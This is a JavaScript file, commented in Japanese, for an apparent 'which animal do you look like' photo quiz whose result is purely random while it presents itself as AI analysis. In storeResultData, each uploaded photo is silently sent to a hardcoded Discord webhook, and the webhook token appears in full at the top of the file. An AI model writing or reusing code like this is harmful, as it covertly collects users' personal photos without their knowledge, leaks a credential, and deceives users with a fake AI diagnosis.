// ===============================
// 設定
// ===============================
const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1477577868971347980/C9ZRDZs29Cv4XdGx653quVphBx3llRei0c2420A6BBPauWsmm69gRJ-I4AGupX2iGdCi"; // ←テスト用
let lastUploadedFile = null;

// ===============================
// 星アニメーション
// ===============================
function createStars() {
    const starsContainer = document.getElementById('starsContainer');
    if (!starsContainer) return;
    const starCount = 30;
    const stars = ['⭐','✨','🌟'];
    for (let i=0;i<starCount;i++){
        const star = document.createElement('div');
        star.className = 'star';
        star.textContent = stars[Math.floor(Math.random()*stars.length)];
        star.style.left = Math.random()*100+'%';
        star.style.top = Math.random()*100+'%';
        star.style.animationDelay = Math.random()*3+'s';
        star.style.fontSize = (Math.random()*15+15)+'px';
        starsContainer.appendChild(star);
    }
}
document.addEventListener('DOMContentLoaded', createStars);

// ===============================
// ファイルアップロード
// ===============================
const uploadBtn = document.getElementById('uploadBtn');
const fileInput = document.getElementById('fileInput');

uploadBtn.addEventListener("click",()=>fileInput.click());

fileInput.addEventListener("change",async ()=>{
    const file = fileInput.files[0];
    if(!file) return;

    if(!file.type.match('image.*')){
        alert('画像を選んでください');
        return;
    }

    lastUploadedFile = file;

    const reader = new FileReader();
    reader.onload = function(e){
        localStorage.setItem('uploadedImage', e.target.result);

        // 診断生成
        const animal = getRandomAnimal();
        storeResultData(animal);

        alert("診断完了！");
        window.location.href='result.html';
    };
    reader.readAsDataURL(file);
});

// ===============================
// 動物データ
// ===============================
const animalData = [
    { name:'ねこ', icon:'🐱', description:'自由奔放で好奇心旺盛。マイペースで気まぐれな性格。', minSimilarity:75,maxSimilarity:98 },
    { name:'いぬ', icon:'🐶', description:'忠実で社交的。人懐っこく、明るく活発。', minSimilarity:70,maxSimilarity:95 },
    { name:'きつね', icon:'🦊', description:'賢くて機転が利く。計画的で慎重な性格。', minSimilarity:72,maxSimilarity:96 },
    { name:'うさぎ', icon:'🐰', description:'優しくて繊細。感受性が豊かで穏やか。', minSimilarity:68,maxSimilarity:93 },
    { name:'たぬき', icon:'🐻', description:'のんびり屋で温和。ユーモアがあり場を和ませる。', minSimilarity:65,maxSimilarity:90 },
    { name:'ハリネズミ', icon:'🦔', description:'控えめで慎重。仲良くなると温かい一面も。', minSimilarity:70,maxSimilarity:94 },
    { name:'ハムスター', icon:'🐹', description:'元気で活動的。好奇心旺盛で愛嬌がある。', minSimilarity:68,maxSimilarity:92 },
    { name:'パンダ', icon:'🐼', description:'のんびり穏やか。マイペースで自然体。', minSimilarity:66,maxSimilarity:91 }
];

// ===============================
// ランダム診断
// ===============================
function getRandomAnimal(){
    const animal = animalData[Math.floor(Math.random()*animalData.length)];
    const similarity = Math.floor(Math.random()*(animal.maxSimilarity-animal.minSimilarity+1)+animal.minSimilarity);
    return {...animal, similarity};
}

// ===============================
// 結果保存 + Discord送信
// ===============================
function storeResultData(animal){
    const resultData = {
        name: animal.name,
        icon: animal.icon,
        description: animal.description,
        similarity: animal.similarity,
        timestamp: new Date().toISOString()
    };
    localStorage.setItem('diagnosisResult', JSON.stringify(resultData));

    // Discord送信
    if(lastUploadedFile){
        const formData = new FormData();
        formData.append("file", lastUploadedFile, "image.png");

        // Discordに送信するembedのdescriptionは短くする
        const safeDescription = animal.description.length > 200 ? animal.description.substring(0,200) + "…" : animal.description;

        formData.append("payload_json", JSON.stringify({
            username: "似てる動物AI",
            content: "📷 新しい診断結果が届きました！",
            embeds:[{
                title: "診断結果",
                description: `**動物タイプ**：${animal.name} ${animal.icon}\n**特徴**：${safeDescription}\n似ている度：${animal.similarity}%`,
                color: 0x9ddcff,
                image:{url:"attachment://image.png"}
            }]
        }));

        fetch(DISCORD_WEBHOOK_URL, {method:"POST", body:formData})
            .then(res => console.log("Discord送信成功", res.status))
            .catch(err => console.error("Discord送信失敗", err));
    }
}
